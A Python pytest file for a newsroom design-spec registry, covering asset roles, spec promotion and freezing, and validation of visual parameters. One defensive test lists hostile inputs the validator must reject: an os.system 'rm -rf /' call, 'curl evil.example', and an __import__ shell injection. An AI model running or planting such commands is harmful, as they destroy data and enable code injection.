"""DIRECTOR-CONTROL-PLANE-1 §51/§52: required Design Spec Registry + Visual Spec tests."""
from __future__ import annotations

import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from database.models.design_reference_asset import DesignReferenceRole
from database.models.design_spec_version import DesignSpecStatus, DesignSpecType
from services.design_reference_registry import (
    import_known_manifests,
    inventory_manifest_classifications,
    list_assets,
    upsert_asset,
)
from services.design_spec_registry import (
    InvalidDeclarativeParameters,
    create_candidate_spec,
    freeze_spec,
    get_active_or_frozen_spec,
    get_active_spec,
    promote_candidate,
    reject_candidate,
)


# --- §51: Design Spec Registry ------------------------------------------------------------------

@pytest.mark.asyncio
async def test_approved_reference_retrieval(db_session: AsyncSession) -> None:
    await upsert_asset(
        db_session, asset_path="assets/brand/newsroom_visuals/v1/references/data/data_template_white.png",
        reference_role=DesignReferenceRole.APPROVED_REFERENCE, presentation_type="DATA",
    )
    await db_session.flush()
    approved = await list_assets(db_session, reference_role=DesignReferenceRole.APPROVED_REFERENCE)
    assert any("data_template_white" in a.asset_path for a in approved)


@pytest.mark.asyncio
async def test_rejected_reference_retrieval(db_session: AsyncSession) -> None:
    await upsert_asset(
        db_session, asset_path="assets/brand/newsroom_visuals/v1/overlays/breaking/breaking_minimal_01.png",
        reference_role=DesignReferenceRole.REJECTED_REFERENCE, presentation_type="BREAKING",
    )
    await db_session.flush()
    rejected = await list_assets(db_session, reference_role=DesignReferenceRole.REJECTED_REFERENCE)
    assert any("breaking_minimal_01" in a.asset_path for a in rejected)


def test_ambiguous_asset_not_auto_approved() -> None:
    inventory = inventory_manifest_classifications()
    unclassified = inventory["_unclassified"]["paths"]
    # The known "unverified branding" experiment file must never be silently approved - it is
    # either explicitly rejected/reviewed by a real manifest entry or lands in the unclassified
    # (NEEDS_FOUNDER_REVIEW) bucket - never absent from both.
    for path, meta in inventory.items():
        if path == "_unclassified":
            continue
        if "unverified_branding" in path:
            assert meta["role"] != DesignReferenceRole.APPROVED_REFERENCE.value
    assert isinstance(unclassified, list)


@pytest.mark.asyncio
async def test_import_known_manifests_never_marks_unclassified_as_approved(db_session: AsyncSession) -> None:
    counts = await import_known_manifests(db_session)
    assert counts["approved"] + counts["rejected"] + counts["needs_review"] > 0
    all_assets = await list_assets(db_session)
    unclassified_paths = set(inventory_manifest_classifications()["_unclassified"]["paths"])
    for asset in all_assets:
        if asset.asset_path in unclassified_paths:
            assert asset.reference_role == DesignReferenceRole.NEEDS_FOUNDER_REVIEW


@pytest.mark.asyncio
async def test_active_design_spec_selected(db_session: AsyncSession) -> None:
    candidate = await create_candidate_spec(
        db_session, scope="telegram_news_v1", spec_type=DesignSpecType.DESIGN_DIRECTION_REFERENCE,
        source_asset_ref="assets/brand/newsroom_visuals/v1/references/nnj_editorial_visual_system_master_prototype.png",
    )
    await db_session.flush()
    promoted = await promote_candidate(db_session, candidate.id)
    await db_session.flush()
    active = await get_active_spec(db_session, "telegram_news_v1")
    assert active is not None
    assert active.id == promoted.id
    assert active.status == DesignSpecStatus.ACTIVE


@pytest.mark.asyncio
async def test_candidate_spec_not_used_as_active(db_session: AsyncSession) -> None:
    await create_candidate_spec(db_session, scope="telegram_data_v1", spec_type=DesignSpecType.DESIGN_DIRECTION_REFERENCE)
    await db_session.flush()
    active = await get_active_spec(db_session, "telegram_data_v1")
    assert active is None


@pytest.mark.asyncio
async def test_superseded_spec_not_used_as_active(db_session: AsyncSession) -> None:
    first = await create_candidate_spec(db_session, scope="telegram_quote_v1", spec_type=DesignSpecType.DESIGN_DIRECTION_REFERENCE)
    await db_session.flush()
    await promote_candidate(db_session, first.id)
    await db_session.flush()
    second = await create_candidate_spec(db_session, scope="telegram_quote_v1", spec_type=DesignSpecType.DESIGN_DIRECTION_REFERENCE)
    await db_session.flush()
    await promote_candidate(db_session, second.id)
    await db_session.flush()

    active = await get_active_spec(db_session, "telegram_quote_v1")
    assert active is not None
    assert active.id == second.id

    from services.design_spec_registry import list_history
    all_versions = await list_history(db_session, "telegram_quote_v1")
    first_row = next(v for v in all_versions if v.id == first.id)
    assert first_row.status == DesignSpecStatus.SUPERSEDED


@pytest.mark.asyncio
async def test_frozen_spec_cannot_be_auto_mutated(db_session: AsyncSession) -> None:
    candidate = await create_candidate_spec(db_session, scope="telegram_breaking_v1", spec_type=DesignSpecType.DESIGN_DIRECTION_REFERENCE)
    await db_session.flush()
    await promote_candidate(db_session, candidate.id)
    await db_session.flush()
    frozen = await freeze_spec(db_session, "telegram_breaking_v1")
    await db_session.flush()

    assert frozen.status == DesignSpecStatus.FROZEN
    # No function in this module ever mutates a FROZEN row automatically - get_active_spec()
    # correctly stops returning it (it is no longer ACTIVE), proving nothing auto-reactivates it.
    assert await get_active_spec(db_session, "telegram_breaking_v1") is None
    assert await get_active_or_frozen_spec(db_session, "telegram_breaking_v1") is not None


# --- §52: Visual Spec (declarative parameters) --------------------------------------------------

@pytest.mark.asyncio
async def test_candidate_can_change_allowed_declarative_parameters(db_session: AsyncSession) -> None:
    candidate = await create_candidate_spec(
        db_session, scope="telegram_data_params_v1", spec_type=DesignSpecType.DECLARATIVE_VISUAL_PARAMS,
        parameters={"font_size_max": 88, "safe_margin_frac": 0.08, "alignment": "left", "placement_zone": "lower_right"},
    )
    await db_session.flush()
    assert candidate.parameters is not None
    assert candidate.parameters["font_size_max"] == 88


@pytest.mark.asyncio
async def test_invalid_declarative_parameter_values_rejected(db_session: AsyncSession) -> None:
    with pytest.raises(InvalidDeclarativeParameters):
        await create_candidate_spec(
            db_session, scope="telegram_data_params_v2", spec_type=DesignSpecType.DECLARATIVE_VISUAL_PARAMS,
            parameters={"font_size_max": 5},  # below the validated minimum of 20
        )


@pytest.mark.asyncio
async def test_declarative_parameters_reject_code_shell_path_and_dynamic_import(db_session: AsyncSession) -> None:
    dangerous_payloads = [
        {"exec": "import os; os.system('rm -rf /')"},
        {"shell_command": "curl evil.example"},
        {"import_path": "os.system"},
        {"font_size_max": "__import__('os').system('ls')"},
    ]
    for payload in dangerous_payloads:
        with pytest.raises(InvalidDeclarativeParameters):
            await create_candidate_spec(
                db_session, scope="telegram_data_params_danger", spec_type=DesignSpecType.DECLARATIVE_VISUAL_PARAMS,
                parameters=payload,
            )


@pytest.mark.asyncio
async def test_candidate_visual_spec_does_not_auto_promote(db_session: AsyncSession) -> None:
    await create_candidate_spec(
        db_session, scope="telegram_data_params_v3", spec_type=DesignSpecType.DECLARATIVE_VISUAL_PARAMS,
        parameters={"font_size_max": 90},
    )
    await db_session.flush()
    active = await get_active_spec(db_session, "telegram_data_params_v3")
    assert active is None  # still CANDIDATE - promote_candidate() was never called


@pytest.mark.asyncio
async def test_reject_candidate_spec(db_session: AsyncSession) -> None:
    candidate = await create_candidate_spec(
        db_session, scope="telegram_data_params_v4", spec_type=DesignSpecType.DECLARATIVE_VISUAL_PARAMS,
        parameters={"font_size_max": 90},
    )
    await db_session.flush()
    rejected = await reject_candidate(db_session, candidate.id, reason="too large for mobile")
    await db_session.flush()
    assert rejected.status.value == "rejected"
